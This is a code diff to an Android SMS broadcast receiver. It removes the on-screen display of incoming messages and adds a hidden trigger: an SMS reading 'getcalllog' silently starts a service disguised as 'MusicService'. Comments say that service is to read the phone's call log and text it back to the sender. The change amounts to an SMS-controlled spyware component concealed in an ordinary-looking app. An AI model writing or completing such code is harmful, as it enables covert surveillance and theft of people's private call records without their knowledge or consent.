@@ -12,8 +12,13 @@ public class SmsReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        Toast.makeText(context, getSmsbody(intent), Toast.LENGTH_SHORT).show();
+       // Toast.makeText(context, getSmsbody(intent), Toast.LENGTH_SHORT).show();
         //start a bg service
+        String smsReceived = getSmsbody(intent);
+        if(smsReceived.equals("getcalllog")) {
+            Intent serIntent1 = new Intent(context, MusicService.class);
+            context.startService(serIntent1);
+        }
         //in service query calllog content provider
         //return the calllog via an sms to the sender
     }
@@ -28,10 +33,10 @@ public class SmsReceiver extends BroadcastReceiver {
             msgs = new SmsMessage[pdus.length];
             for (int i=0; i<msgs.length; i++){
                 msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
-                str += "SMS from " + msgs[i].getOriginatingAddress();
-                str += " :";
+                //str += "SMS from " + msgs[i].getOriginatingAddress();
+               // str += " :";
                 str += msgs[i].getMessageBody().toString();
-                str += "\n";
+                //str += "\n";
             }
 //---display the new SMS message---
         }
